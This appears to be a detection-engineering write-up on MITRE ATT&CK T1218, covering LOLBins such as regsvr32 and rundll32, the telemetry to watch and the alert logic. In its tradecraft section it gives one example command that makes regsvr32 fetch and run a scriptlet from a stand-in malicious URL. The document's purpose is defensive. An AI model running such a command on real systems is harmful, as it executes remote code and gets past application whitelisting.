# Detection: Signed Binary Proxy Execution

MITRE ATT&CK Technique: T1218
Tactic: Defense Evasion

---

# Overview

Signed binaries trusted by the operating system can be abused to execute malicious payloads.

These binaries are known as **LOLBins (Living-Off-The-Land Binaries)**.

---

# Adversary Tradecraft

Common LOLBins include:

```
mshta.exe
rundll32.exe
regsvr32.exe
installutil.exe
```

Attackers abuse these binaries to bypass application whitelisting.

Example:

```
regsvr32 /s /n /u /i:http://malicious/payload.sct scrobj.dll
```

---

# Endpoint Telemetry

Key telemetry signals include:

• execution of trusted binaries with suspicious command lines
• execution from user directories
• network connections initiated by system binaries

---

# Detection Logic

Alert when:

• LOLBins execute scripts from remote URLs
• system utilities spawn suspicious child processes
• command line arguments indicate script execution
